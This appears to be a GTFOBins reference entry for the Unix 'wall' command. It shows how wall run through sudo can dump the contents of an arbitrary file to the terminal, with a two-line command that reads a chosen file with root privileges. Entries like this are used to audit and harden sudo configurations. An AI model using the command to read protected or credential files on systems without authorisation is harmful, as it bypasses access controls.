# GTFOBin: wall

The textual file is dumped on the current TTY (neither to `stdout` nor to `stderr`).

## Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

```
LFILE=file_to_read
sudo wall --nobanner "$LFILE"
```